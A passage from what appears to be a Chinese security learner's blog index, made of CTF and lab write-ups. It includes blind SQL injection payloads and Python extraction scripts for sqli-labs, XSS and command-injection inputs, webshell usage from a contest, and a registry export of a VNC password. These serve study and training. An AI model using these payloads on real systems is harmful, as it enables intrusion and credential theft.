table_name=&#39;&quot;+table_name+&quot;&#39;&quot; 4.数据payload ?id=1&#39; and ascii(substr((select username from security.users limit 0,1),1,1))&gt;65--+ 脚本 column_name = [&quot;id&quot;,&quot;username&quot;,&quot;password&quot;] select_str = &quot;select concat_ws(&#39;-&#39;,&quot;+column_name[0]+&quot;,&quot;+column_name[1]+&quot;,&quot;+column_name[2]+&quot;) from &quot;+table_name+&quot; limit &quot;+str(result_index)+&quot;,1&quot; 脚本# conding:utf-8 import requests url_init = &quot;http://localhost/sqli-labs/Less-8/?id=1&quot;;; url_init_error = url_init + &quot;&#39;&quot; length_init = requests.get(url_init).headers.get(&#39;Content-Length&#39;) database=&quot;&quot; # and ascii(substr((select database()),1,1))&gt;64 %23 然后不断增加后面的数字大小来确定 #and ascii(substr((select table_name from information_schema.tables where table_schema=hex(int (database))),1,1))&gt;64 %23 # 写一个方法二分快速获取应该判断的数字 # 返回数字，传入布尔值，对还是错，对应的数字。 # 正经的二分查询。有序的字符中，最大最小。65到122 # 我们现在知道了返回长度多少是正确的和错误的 # def get_length(url): length = requests.get(url).headers.get(&#39;Content-Length&#39;) #print(&quot;length:&quot;+str(length)) # 正确的 if (length == length_init): return True else: return False def geturl(n,number): url = url_init_error+&quot;and ascii(substr((select database()),{0},1))&gt;{1} %23&quot;.format(n,number) print(url) return url def efs(min_number,max_number,n): if(max_number-min_number==1): print(&quot;[+] get &quot;+chr(max_number)) global database database=database+(chr(max_number)) print(&#39;[+] databse is {0}&#39;.format(database)) return number = int((min_number+max_number)/2) #print(number) url = geturl(n,number) #print(url) #如果比中间大 if get_length(url): efs(number,max_number,n) else: efs(min_number,number,n) for n in range(1,10): #如果大于1都不满足就是结束了 if(get_length(geturl(n,1))is False): break else: efs(65,127,n) Less-9基于时间的GET单引号盲注Time型盲注和Bool型盲注应用场景不同之处在报错的返回上。Less8中，输入合法时会返回正常页面“You are in”，而非法输入时没有返回任何东西。于是可以根据这个特点跑盲注，通过不同的返回页面来判断匹配的字符是否正确。而在Less9中，合法输入与非法输入返回为同一个固定字符串。这样就不能根据页面的回显来判断匹配结果，要使用延时函数sleep()对两种输入进行区分。注意Time盲注时，穷举会比二分查找快很多。Bool盲注时，则二分查找更快一些。1、测试过程同Less8。与Less8相比，用了sleep()函数。2、注入注入过程同Less8。与Less8相比，用了sleep()函数。1.猜库payload 输入?id=1&#39; and if(ascii(substr((select database()),1,1))&gt;114,1,sleep(5))--+正常 输入?id=1&#39; and if(ascii(substr((select database()),1,1))&gt;115,1,sleep(5))--+延迟 说明第一个字符是s，然后以此类推得出数据库名。2.猜表payload 输入?id=1&#39; and if((ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1))&gt;100),1,sleep(5))--+正常 输入?id=1&#39; and if((ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1))&gt;101),1,sleep(5))--+延迟 说明第一个表的第一个字符为“e”。3.猜字段payload 输入?id=1&#39; and if((ascii(substr((select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 0,1),1,1))&gt;104),1,sleep(5))--+正常 输入?id=1&#39; and if((ascii(substr((select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 0,1),1,1))&gt;105),1,sleep(5))--+延迟 说明第一个字符为“i”。4.数据payload 输入?id=1&#39; and if((ascii(substr((select username from security.users limit 0,1),1,1))&gt;67),1,sleep(5))--+正常 输入?id=1&#39; and if((ascii(substr((select username from security.users limit 0,1),1,1))&gt;68),1,sleep(5))--+延迟 说明第一个字符为“D”。 脚本import requests value =&quot;abcdefghigklmnopqrstuvwxyz@_.&quot; data=&quot;&quot; url = &quot;http://localhost:9096/sqli-labs/Less-9/?id=1&#39; and if((substr(({0}),{1},1)=&#39;{2}&#39;),sleep(5),NULL); %23&quot; url_length=&quot;http://localhost:9096/sqli-labs/Less-9/?id=1&#39; and if((length(({0}))={1}),sleep(5),NULL); %23&quot; def get_length(payload): for n in range(1,100): url= url_length.format(payload,n) print(url) if(get_respone(url)): print(&quot;[+] length is {0}&quot;.format(n)) return n def get_data(payload,value,length): for n in range(1,length): for v in value : url_data = url.format(payload,n,v) print(url_data) if(get_respone(url_data)): global data data=data+v print(&quot;[+] data is {0}&quot;.format(data)) break def get_respone(url): try: html = requests.get(url,timeout=4) return False except Exception as e: print(&quot;......&quot;) return True databse_payload =&quot;select database()&quot; get_data(databse_payload,value,get_length(databse_payload)+1) Less-10基于时间的GET双引号盲注和Less9差别只在于单双引号，修改查询语句闭合后用脚本注入即可。 感悟总结之后，又对盲注有了更深一步的理解。脚本是硬伤，我要继续好好学习python了。小白进阶ing。。。。","categories":[{"name":"漏洞原理","slug":"漏洞原理","permalink":"https://qwzf.github.io/categories/漏洞原理/"},{"name":"SQL注入","slug":"漏洞原理/SQL注入","permalink":"https://qwzf.github.io/categories/漏洞原理/SQL注入/"}],"tags":[{"name":"靶场练习","slug":"靶场练习","permalink":"https://qwzf.github.io/tags/靶场练习/"},{"name":"导出文件注入","slug":"导出文件注入","permalink":"https://qwzf.github.io/tags/导出文件注入/"},{"name":"GET型盲注","slug":"GET型盲注","permalink":"https://qwzf.github.io/tags/GET型盲注/"}],"author":"qwzf"},{"title":"攻防世界-Web(新手区)","slug":"攻防世界-Web(新手区)","date":"2019-07-17T13:22:27.964Z","updated":"2019-09-05T16:01:47.759Z","comments":true,"path":"2019/07/17/攻防世界-Web(新手区)/","link":"","permalink":"https://qwzf.github.io/2019/07/17/攻防世界-Web(新手区)/","excerpt":"","text":"前言暑假前，为了学习Web题，做了攻防世界的新手区的Web题，当时没有总结，现在总结一下。 正文Web1：view_source查看源代码，右键不可以用。所以按F12，直接查看源码即可。 Web2：get_post HTTP的两种请求方式GETGET请求的数据会附在URL之后（就是把数据放置在HTTP协议头中）如： /test/1.php?name1=value1&amp;name2=value2 POSTPOST请求是把提交的数据放置在HTTP的消息主体中 如： POST /test/1.php HTTP/1.1 Host: w3schools.com name1=value1&amp;name2=value2 所以为了方便，直接用火狐进行传参，即可得出flag。 Web3：robots robots协议robots.txt文件是一个文本文件，使用任何一个常见的文本编辑器，比如Windows系统自带的Notepad，就可以创建和编辑它[1] 。robots.txt是一个协议，而不是一个命令。robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。 联想到在URL后加上robots.txt URL后加上f1ag_1s_h3re.php 在URL后加上robots.txt便得到了flag Web4：backup不知道。。。百度一下index.php文件的备份文件,在后面加上”.bak”,即index.php.bak得到flag。 Web5：cookie用Burpsuite抓包添加url后缀名cookie.php查看HTTP响应，即可得出flag Web6：disabled_button查看源码发现有disabled属性，disabled属性可设置或返回是否禁用单选按钮。所以删掉disabled属性删掉后可以点击了，点击一下，得到flag Web7：simple_js查看源码发现这个地方比较可疑，像16进制所以16进制转ASCII文本好像是ASCII码10进制值，所以10进制转ASCII得到flag Web8：xff_referer看到题目先了解下xff和referer XFFX-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。 简单地说，xff是告诉服务器当前请求者的最终ip的http请求头字段通常可以直接通过修改http头中的X-Forwarded-For字段来仿造请求的最终ip RefererHTTP来源地址（referer，或HTTPreferer）是HTTP表头的一个字段，用来表示从哪儿链接到当前的网页，采用的格式是URL。换句话说，借着HTTP来源地址，当前的网页可以检查访客从哪里而来，这也常被用来对付伪造的跨网站请求。 简单的讲，referer就是告诉服务器当前访问者是从哪个url地址跳转到自己的，跟xff一样，referer也可直接修改题目说IP地址必须为123.123.123.123所以抓包修改XFF而又显示请求来自http://www.google.com/，所以修改Referer然后点击Go，得到flag Web9：weak_auth(弱身份验证)随手设的密码，应该就是弱口令。而用户名是admin所以直接用Burpsuite进行字典(弱口令字典)爆破将password的值设为变量选择字典文件发现到123456时，长度不同，所以密码为123456，登陆一下即可得出flag Web10：webshell看题目，应该是一句话木马果然是一句话木马，直接菜刀连连接成功，得到flag Web11：command_execution(命令执行)看题目，先了解下ping、waf、命令执行、Linux命令 pingping命令用法 WAFWAFWAF主要防护的是来自对网站源站的动态数据攻击，可防护的攻击类型包括SQL注入、XSS攻击、CSRF攻击、恶意爬虫、扫描器、远程文件包含等攻击,相当于防火墙。 命令执行命令执行常见命令执行 command1 &amp; command2 ：先执行command2后执行command1 command1 &amp;&amp; command2 ：先执行command1后执行command2 command1 | command2 ：只执行command2 command1 || command2 ：command1执行失败，再执行command2(若command1执行成功，就不再执行command2) Linux常用命令常用的Linux命令开始做题首先先尝试ping一下127.0.0.1方法一： ls命令查看目录文件用cat命令查看txt文件方法二：首先先尝试ping一下127.0.0.1，并回显执行的命令ping通本地后，发现传输三个数据包。查看三个数据包中是否有flag.txt输入命令 127.0.0.1 &amp; find / -name flag.txt 发现有flag.txt，再输入命令 127.0.0.1 | cat /home/flag.txt 查看flag.txt文件，得出flag Web12：simple_php看题目，这应该是代码审计 is_numeric() 函数用于检测变量是否为数字或数字字符串。 传入对应的参数即可得出flag 感悟做完攻防世界新手区的Web题，对Web题的类型有了大致了解。题不是太难，但可以学习到很多Web题的基础知识。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/tags/CTF/"},{"name":"Web","slug":"Web","permalink":"https://qwzf.github.io/tags/Web/"},{"name":"攻防世界","slug":"攻防世界","permalink":"https://qwzf.github.io/tags/攻防世界/"}],"author":"qwzf"},{"title":"安恒月赛7月-MISC wp","slug":"安恒月赛7月-MISC wp","date":"2019-07-15T11:33:17.025Z","updated":"2019-07-31T16:10:49.210Z","comments":true,"path":"2019/07/15/安恒月赛7月-MISC wp/","link":"","permalink":"https://qwzf.github.io/2019/07/15/安恒月赛7月-MISC wp/","excerpt":"","text":"前言今天安恒月赛，和最近一部热剧有一点点关系。而我就做出了两道MISC题，还是写一下Write Up。。。。 MISC1：真正的CTFer在哪？！ 下载解压题目文件，发现一张图片 用binwalk分析一下，并没有隐藏文件 查看图片详细信息，没有隐藏东西。然后看了下图片宽高(分辨率)，并用winHex打开发现，高度不一致 将分辨率转换成16进制，0500应该改为0A00。高度恢复了 发现flag了 发现看不清，也可以看出。想用stegsove反色看一下，然而用stegsolve打不开修改高度后的图片。 于是百度了下原因 对一张正常的图片，通过修改其宽度或者高度隐藏信息，使计算出的CRC校验码与原图的CRC校验码不一致；windows的图片查看器会忽略错误的CRC校验码，因此会显示图片，但此时的图片已经是修改过的，所以会有显示不全或扭曲等情况，借此可以隐藏信息。 而Linux下的图片查看器不会忽略错误的CRC校验码，因此用Linux打开修改过宽或高的png图片时，会出现打不开的情况 箭头所指即为crc效验码。 可以通过爆破图片修改前的宽和高来匹配CRC校验码，并用正确的宽和高来修复图片 为了做题的方便，先尝试爆破高度，脚本如下(百度搜的，还不会写，只修改了参数)： # -*- coding: utf-8 -*- import binascii import struct #\\x49\\x48\\x44\\x52\\x00\\x00\\x01\\xF4\\x00\\x00\\x01\\xA4\\x08\\x06\\x00\\x00\\x00 crc32key = 0x6F03AD71 for i in range(0, 65535): height = struct.pack(&#39;&gt;i&#39;, i) #CRC: 6F03AD71 data = &#39;\\x49\\x48\\x44\\x52\\x00\\x00\\x05\\x1C&#39; + height + &#39;\\x08\\x06\\x00\\x00\\x00&#39; crc32result = binascii.crc32(data) &amp; 0xffffffff if crc32result == crc32key: print &#39;&#39;.join(map(lambda c: &quot;%02X&quot; % ord(c), height)) 运行脚本，输出000009E4，即原图片高度为00 00 09 E4爆破成功 修改后，发现可以用stegsolve打开了 MISC2：解不开的秘密 下载题目文件并解压。发现一个word文档和file文件。word文档是加密的，file是一串16进制。Hex转ASCII 很明显应该是Base64，解密 发现很多信息，第一印象先考虑password的值，发现并不对。于是仔细分析下解密的内容 Windows Registry Editor Version 5.00 [HKEY_CURRENT_USER\\Software\\RealVNC] [HKEY_CURRENT_USER\\Software\\RealVNC\\vnclicensewiz] &quot;_AnlClientId&quot;=&quot;8f5cc378-2e1d-4670-80e0-d2d81d882561&quot; &quot;_AnlSelected&quot;=&quot;0&quot; &quot;_AnlInclRate&quot;=&quot;0.0025&quot; [HKEY_CURRENT_USER\\Software\\RealVNC\\vncserver] [HKEY_CURRENT_USER\\Software\\RealVNC\\VNCViewer4] &quot;dummy&quot;=&quot;&quot; [HKEY_CURRENT_USER\\Software\\RealVNC\\VNCViewer4\\MRU] &quot;00&quot;=&quot;127.0.0.1&quot; &quot;Order&quot;=hex:00,01 &quot;01&quot;=&quot;127.0.0.1:5900&quot; [HKEY_CURRENT_USER\\Software\\RealVNC\\WinVNC4] &quot;Password&quot;=hex:37,5e,be,86,70,b3,c6,f3 &quot;SecurityTypes&quot;=&quot;VncAuth&quot; &quot;ReverseSecurityTypes&quot;=&quot;None&quot; &quot;QueryConnect&quot;=dword:00000000 &quot;PortNumber&quot;=dword:0000170c &quot;LocalHost&quot;=dword:00000000 &quot;IdleTimeout&quot;=dword:00000e10 &quot;HTTPPortNumber&quot;=dword:000016a8 &quot;Hosts&quot;=&quot;+,&quot; &quot;AcceptKeyEvents&quot;=dword:00000001 &quot;AcceptPointerEvents&quot;=dword:00000001 &quot;AcceptCutText&quot;=dword:00000001 &quot;SendCutText&quot;=dword:00000001 &quot;DisableLocalInputs&quot;=dword:00000000 &quot;DisconnectClients&quot;=dword:00000001 &quot;AlwaysShared&quot;=dword:00000000 &quot;NeverShared&quot;=dword:00000000 &quot;DisconnectAction&quot;=&quot;None&quot; &quot;RemoveWallpaper&quot;=dword:00000000 &quot;RemovePattern&quot;=dword:00000000 &quot;DisableEffects&quot;=dword:00000000 &quot;UseHooks&quot;=dword:00000001 &quot;PollConsoleWindows&quot;=dword:00000001 &quot;CompareFB&quot;=dword:00000001 &quot;Protocol3.3&quot;=dword:00000000 &quot;dummy&quot;=&quot;&quot; 百度搜索一下关键字RealVNC，发现这是VNC加密。了解一下相关知识 1、因为VNC的密码是保存在注册表中的，需要能读出来，这一点比PCANYWHERE的利用难度大一点 VNC3.0版本的的密码存放在HKEY_CURRENT_USER\\Software\\ORL\\WinVNC3\\Password 处 VNC4.0版本的密码存放在HKEY_CURRENT_USER\\Software\\RealVNC\\WinVNC4\\Password 处 2、假如我们已经获得了web服务器的webshell权限，同时对注册表有读取权限（这里如何获得web服务器的webshell权限，暂不介绍），我们使用命令webshell命令regedit -e c:\\vnc.reg HKEY_CURRENT_USER\\Software\\RealVNC\\WinVNC4\\ 把注册表信息导出到c盘下的vnc.reg文件，然后右键编辑 如上图，我们看到了加密后保存在注册表里的vnc密码，可以使用破解软件vncx4.exe来破解该密码 命令：vncx4 -W然后顺序输入上面的每一个十六进制数据，每输完一个回车一次就行了 得到的密码，应该就是word文档的密码了。输入密码打开 根据提示，flag应该就在这里了。 首先，保存word里的图片，考虑图片隐写。然而并不是图片隐写，那flag应该还在word里。移走图片，发现 这个地方可能有东西，文件-&gt;选项-&gt;显示。显示(打印)隐藏文字。 然而并没有什么用。于是直接复制那串空白，粘贴到一个地方，得到flag了。。。 感悟做了安恒月赛的题，发现自己依旧还很菜。不过在做题的过程中又学到了新知识。 小白进阶ing。。。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/tags/CTF/"},{"name":"MISC","slug":"MISC","permalink":"https://qwzf.github.io/tags/MISC/"},{"name":"安恒","slug":"安恒","permalink":"https://qwzf.github.io/tags/安恒/"}],"author":"qwzf"},{"title":"XSS漏洞攻关(二)","slug":"XSS漏洞攻关(二)","date":"2019-07-14T11:01:42.540Z","updated":"2020-08-01T16:35:36.649Z","comments":true,"path":"2019/07/14/XSS漏洞攻关(二)/","link":"","permalink":"https://qwzf.github.io/2019/07/14/XSS漏洞攻关(二)/","excerpt":"","text":"前言之前已经总结过一部分xss的一些绕过方式，但由于其他原因没有总结完，现在有时间了，于是参考了大牛的博客，继续总结了一下。 正文XSS攻击常见利用方式(后续)7.HTTP头流量包注入这一部分需要抓包改包，还好之前学习了点HTTP协议基础。 就再次了解下BurpSuite怎么抓包改包就行了。 参考博客：Burpsuite拦截并修改request/response Level11 12 13 这三道题都是一样的利用方式，从Level10过来之后，会发现Level11的&lt;input&gt;标签里面t_ref默认值是该网页是从Level10页面链接过来的。 所以对其进行抓包，修改Referer参数。 因为Level11是referer，所以得用burpsuite来抓包改，直接用hackbar是改不了的。 参考payload: &quot; type=&quot;text&quot; onclick=&quot;alert() ” onmouseover=&#39;alert(1)&#39; type=&quot;text&quot; 修改成payload之后，点击Forword转发报文(发包)即可 看到多出来一个框，因为我使用的是onclick事件，所以要鼠标点击一下才会触发。 Level12、Level13的payload是一样的，只是输入点不一样而已，Level12注入点是User-Agent，Level12注入点是cookie 8.其他后边的关卡好像比较难，就不分利用类型了。 Level 14 看了大牛的博客才知道这道题崩了。。。听说图片exif 藏有xss payload Level 15 看了大牛的博客，知道这一关考的是angular js的知识。好像不会。。。稍微百度一下相关知识 发现ng-include有包含文件的意思，也就相当于php里面的include。 发现可以包含第一关的页面， 参考payload: &#39;level1.php?name=&lt;img src=x onerror=alert(1)&gt;&#39; 至于为什么这么构造payload。现在还不太懂。。。 Level 16 与Level 15相比，过滤了空格。可以选择用其他符号来绕过。如：%0a%0d 参考payload: &lt;img%0a%0dsrc=x%0a%0donerror=alert(1)&gt; Level 17 18 这两关的考点是一样的，同样的payload可以绕过。 参考payload: onmouseover=alert(1) 注意：onmouseover前面有一个空格 Level 19 20 都过滤了双引号，闭合不了。看大牛的博客，发现应该是考flash的。我不会，略过。。。去看一下21题，好像崩了。。。。就先这样吧。。。 感悟这次闯关，又学习到不少知识。尤其是学到了burpsuite的抓包改包相关的知识。 这次做题有点着急。由于不会，看了一些参考博客，这样不利于自己解题。希望自己再接再励。。 小白进阶ing","categories":[{"name":"漏洞原理","slug":"漏洞原理","permalink":"https://qwzf.github.io/categories/漏洞原理/"},{"name":"XSS","slug":"漏洞原理/XSS","permalink":"https://qwzf.github.io/categories/漏洞原理/XSS/"}],"tags":[{"name":"XSS绕过","slug":"XSS绕过","permalink":"https://qwzf.github.io/tags/XSS绕过/"}],"author":"qwzf"},{"title":"Crypto-位移编码","slug":"Crypto-位移编码","date":"2019-07-12T13:32:41.000Z","updated":"2019-07-31T15:46:31.161Z","comments":true,"path":"2019/07/12/Crypto-位移编码/","link":"","permalink":"https://qwzf.github.io/2019/07/12/Crypto-位移编码/","excerpt":"","text":"前言学习了解了一下简单的移位编码，于是做题总结了一下 Crypto1：困在栅栏里的凯撒 看到题目，应该和凯撒密码和栅栏密码有关。所以做题之前先了解一下栅栏密码和凯撒密码 栅栏密码栅栏密码是一种简单的移动字符位置的加密方法，规则简单，容易破解。栅栏密码的加密方式：把文本按照一定的字数分成多个组，取每组第一个字连起来得到密文1，再取每组第二个字连起来得到密文2……最后把密文1、密文2……连成整段密文。例如： 明文：栅栏密码加密规则示例每组字数：5 按照字数先把明文分成：栅栏密码加密规则示例 先取每组第一个字：栅密再取每组第二个字：栏规…… 最后得到“栅密栏规密则码示加例”。 解密则反推：密文被分成2个字一组：栅密栏规密则码示加例 先取每组第一个字：栅栏密码加再取每组第二个字：密规则示例 最后得到“栅栏密码加密规则示例”。 凯撒密码凯撒密码最早由古罗马军事统帅盖乌斯·尤利乌斯·凯撒在军队中用来传递加密信息，故称凯撒密码。这是一种位移加密方式，只对26个字母进行位移替换加密，规则简单，容易破解。下面是位移1次的对比： 明文字母表 Z A B C D E F G H I J K L M N O P Q R S T U V W X Y 密文字母表 A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 将明文字母表向后移动1位，A变成了B，B变成了C……，Z变成了A。同理，若将明文字母表向后移动3位： 明文字母表 X Y Z A B C D E F G H I J K L M N O P Q R S T U V W 密文字母表 A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 则A变成了D，B变成了E……，Z变成了C。 字母表最多可以移动25位。凯撒密码的明文字母表向后或向前移动都是可以的，通常表述为向后移动，如果要向前移动1位，则等同于向后移动25位，位移选择为25即可。 下面开始做题 ”困在栅栏里的凯撒“，应该是先栅栏解密，再凯撒解密。因为直接先凯撒好像没有规律。 想到最后结果开头应该是CTF或flag。所以栅栏解密时，花括号前有三个或四个字母 然后再凯撒解密 得到flag了。。。。 Crypto2：变异凯撒 格式是flag{}，与密文的ASCII比较发现 一步一步比较： flag{Caesar_variation} 这样就得到flag了。。 Crypto3：密文 rot13 先了解一下 rot13的相关知识ROT5、ROT13、ROT18、ROT47 编码是一种简单的码元位置顺序替换暗码。此类编码具有可逆性，可以自我解密，主要用于应对快速浏览，或者是机器的读取，而不让其理解其意。 ROT5 是 rotate by 5 places 的简写，意思是旋转5个位置，其它皆同。下面分别说说它们的编码方式：ROT5：只对数字进行编码，用当前数字往前数的第5个数字替换当前数字，例如当前为0，编码后变成5，当前为1，编码后变成6，以此类推顺序循环。ROT13：只对字母进行编码，用当前字母往前数的第13个字母替换当前字母，例如当前为A，编码后变成N，当前为B，编码后变成O，以此类推顺序循环。ROT18：这是一个异类，本来没有，它是将ROT5和ROT13组合在一起，为了好称呼，将其命名为ROT18。ROT47：对数字、字母、常用符号进行编码，按照它们的ASCII值进行位置替换，用当前字符ASCII值往前数的第47位对应字符替换当前字符，例如当前为小写字母z，编码后变成大写字母K，当前为数字0，编码后变成符号_。用于ROT47编码的字符其ASCII值范围是33－126，具体可参考ASCII编码。 于是rot13解码，得到最终结果 感悟总结又使我收获好多，题比较基础，不过可以借此了解一下移位编码的基础知识。继续努力！！！ 小白进阶ing。。。。。。。。。。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/tags/CTF/"},{"name":"Crypto","slug":"Crypto","permalink":"https://qwzf.github.io/tags/Crypto/"},{"name":"移位编码","slug":"移位编码","permalink":"https://qwzf.github.io/tags/移位编码/"}],"author":"qwzf"},{"title":"MISC-图片隐写","slug":"MISC-图片隐写","date":"2019-07-10T13:05:43.000Z","updated":"2019-07-31T15:51:18.897Z","comments":true,"path":"2019/07/10/MISC-图片隐写/","link":"","permalink":"https://qwzf.github.io/2019/07/10/MISC-图片隐写/","excerpt":"","text":"MISC1：Paint&amp;Scan标题的意思是画图和扫描 题目提示也是。下载题目文件并解压，得到txt文件。打开 很明显就是画图了。用到画图工具gnuplot。所以先替换，将坐标转换成gnuplot能识别的格式 然后开始画图，画图命令plot &quot;Paint&amp;Scan.txt&quot; 画出了张二维码 二维码扫一下，得到flag MISC2：九连环 题目没有提示。打开链接保存jpg图片 binwalk分析一下 图片里隐藏了文件，foremost分离一下。为了方便，可以直接用winRAR打开jpg图片，并解压隐藏文件。 有一个加密了。先看是不是伪加密 是伪加密，把504B0102后第五、第六位0108改为0000，即可破解伪加密 解压 这应该是张jpg图片，用winHex查看果然是。加文件后缀.jpg，打开图片 没有有效信息，那看一下解压得到的qwe.zip压缩包，用winRAR打开 发现加密的flag.txt文件。用winHex打开qwe.zip，发现并不是伪加密。好像进行不下去了，于是参考了下大牛的博客。发现要用到一个工具steghide。 用法：steghide extract -sf picture.jpg 然后输入密码，没有密码则回车跳过 于是刚才那张图片就可以用到了 得到一个ko.txt文件。打开，发现flag.txt文件的密码了，输入密码，打开flag.txt。得到flag MISC3：欢迎来到地狱 下载题目文件并解压 打开地狱伊始.jpg 无法打开，用winHex查看一下文件格式，发现缺少文件头 jpg图片的文件头是FFD8FF，添加文件头 保存图片并打开 图片里有个百度云盘链接，输入浏览器打开 下载wav音频文件，播放，发现比较有规律。应该是音频隐写了。使用音频分析工具Audacity打开wav文件，然后 发现大致有三种波形。想到了摩斯电码，于是将不同波形转换成摩斯电码 摩斯电码解密得到 打开第二层地狱.docx，发现被加密了。上面应该就是密码了，有点坑的是密码小写，即letusgo 打开之后，选择显示隐藏文字 发现 image steganography(图片隐写术) 解密网站：https://www.atool.org/steganography.php 所以保存word文档里的图片，用上面网站解密 这应该就是快到终点了.zip的解压密码了 同理解压地狱大门.jpg 打开最后一层地狱.txt 8位二进制一组，二进制转ASCII码 发现解密结果是：弱口令 将地狱大门.jpg用winRAR打开，发现txt加密文件。并不是伪加密，应该就是上边提示的是弱口令。改地狱大门.jpg后缀为.zip，用Ziperello和弱口令字典破解得 输入密码解压txt文件，并打开 很明显Base64解码 继续转 发现Salted，应该就是所谓的“加盐”了 试了之后发现是加密算法是Rabbit 看到明文，结合txt文件里“凯撒家族”和“sixfour”，应该要凯撒解密,且偏移量可能是10或6或4。为了方便，我直接找到解密所有结果的 得到flag了。 做了三道题，总结完毕。小白进阶ing","categories":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/tags/CTF/"},{"name":"MISC","slug":"MISC","permalink":"https://qwzf.github.io/tags/MISC/"},{"name":"隐写","slug":"隐写","permalink":"https://qwzf.github.io/tags/隐写/"}],"author":"qwzf"},{"title":"ISCC2019线下赛总结","slug":"ISCC2019线下赛总结","date":"2019-06-23T16:07:01.996Z","updated":"2020-08-01T16:11:26.807Z","comments":true,"path":"2019/06/24/ISCC2019线下赛总结/","link":"","permalink":"https://qwzf.github.io/2019/06/24/ISCC2019线下赛总结/","excerpt":"","text":"前言今年的ISCC线下赛，完美结束了。这是我第一次参加ctf线下赛，同时非常有幸能够参加这次竞赛。在比赛中又学到了好多知识。于是现在按照惯例，当然是总结一下了。。。。。。 简介整个赛程分为：上午的选择题、ctf题和下午的攻防赛。 上午的选择题，大部分是去年的原题。ctf题感觉有点难度，不过前两道，也是原题。 在下午赛程中几乎被大佬们吊打。在大佬打我们的私地1的时候，我们还没做出自己私地1的题，也意味着我们还没拿到自己的第一个靶机。。。再次显示出我很菜很菜。 正文看着分不断往下掉。心理非常慌，不断查百度、google，找到了非常类似的题，队友复现一波，我们终于有机会拿到自己队的第一个靶机。 1、获得ssh私地1：私地1解题详情。 私地2：私机二是高端口，可以扫出来是12580。然而，第二个靶机我们并没拿到，后期被打的很惨。。。。 2、登录连接ssh意想不到的是，拿到ssh账号和密码后，竟没有第一时间登陆上，而又刚好开始了新的一轮，以至于我们再次掉分。 主要是上面这个，当我意外的把“密码”改成“Keybord Interactive”的时候，登上了，但是当时不知道为什么，毕竟第一次参加线下赛。于是我现在查了一下原因，发现： 基于口令的验证方式（password authentication method），通过输入用户名和密码的方式进行远程机器的登录验证。基于公共密钥的安全验证方式（public key authentication method），通过生成一组密钥（public key/private key）来实现用户的登录验证。基于键盘交互的验证方式（keyboard interactive authentication method），通过服务器向客户端发送提示信息，然后由客户端根据相应的信息通过手工输入的方式发还给服务器端。 3、修补防御在登陆上ssh账号和密码后。我们做的第一件事情就是备份！备份！备份！ 然后如果某次遇到弱口令，一定要改ssh密码，我还不会改。。。。 接下来，开启修补漏洞、删后门的工作l。 1.WAF我先上waf 用法： 将waf.php传到要包含的文件的目录 在所需要防护的页面加入代码require_once(&#39;waf.php&#39;);就可以做到页面防注入、跨站。 如果想整站防注，就在网站的一个公用文件中，如数据库链接文件config.inc.php中！添加require_once(&#39;waf.php&#39;);来调用本代码 2.文件监控学长赛前给了个脚本，但是作为十成十的小白，当时没有用，也不太会用。 用法： jiankong.py /var/www/html 网上也有很多文件监控脚本，也可以自己搜下。 3.删后门先用D盾扫了下，没发现后门。。。那手工检查下吧，emmmm。。。发现了好多后门，有点尴尬！然后我开始了删除大佬后门的操作，本来感觉一切都很顺利。然而，当队友看我删完后，他刷新一下，发现有两个删过的后门又出现了。。。试了几次依旧删不掉。猜想这俩应该就是不死马了。 不死马的使用： URL+.index.php POST pass=Sn3rtf4ck9&amp;a=system(&#39;ipconfig&#39;); 例如： http://127.0.0.1/.index.php post：pass=Sn3rtf4ck9&amp;a=system(&#39;ipconfig&#39;); 我们被按的两个不死马如下： 然而，我并没有删过不死马。于是看了赛前学长给我们的工具包，发现解除不死马的文件了。 emmmmm。。。。发现并不会用。作为小白的我，有点蓝瘦。亡羊补牢一下吧，现在开始学习了解一下： 解除不死马： 方法一：找工作人员重置私地虚拟机（听说有三次机会） 方法二：写个脚本不断查杀 方法三：找到木马名字。找到创建，木马对应的进程。修改解除不死马.php 4、日志分析我忘了放上去了。。。。。。但这也是很重要的 1.感知可能正在发生的攻击，从而规避存在的安全风险 2.应急响应，还原攻击者的攻击路径，从而挽回已经造成的损失 记录log脚本 这种脚本网上有很多。 脚本 &lt;?php date_default_timezone_set(&#39;Asia/Shanghai&#39;); $ip = $_SERVER[&quot;REMOTE_ADDR&quot;]; //记录访问者的ip $filename = $_SERVER[&#39;PHP_SELF&#39;];//访问者要访问的文件名 $parameter = $_SERVER[&quot;QUERY_STRING&quot;]; //访问者要请求的参数 $time = date(&#39;Y-m-d H:i:s&#39;,time()); //访问时间 $logadd = &#39;来访时间：&#39;.$time.&#39;--&gt;&#39;.&#39;访问链接：&#39;.&#39;http://&#39;.$ip.$filename.&#39;?&#39;.$parameter.&quot;rn&quot;; // log记录 $fh = fopen(&quot;log.txt&quot;, &quot;a&quot;); fwrite($fh, $logadd); fclose($fh); ?&gt; 日志分析工具 1.LogForensics 腾讯实验室 https://security.tencent.com/index.php/opensource/detail/15 2.北风飘然@金乌网络安全实验室 https://www.freebuf.com/sectool/126698.html 3.网络ID为piaox的安全从业人员： https://www.freebuf.com/sectool/110644.html 4.网络ID：SecSky https://www.freebuf.com/sectool/8982.html 5.网络ID：鬼魅羊羔 http://www.freebuf.com/articles/web/96675.html 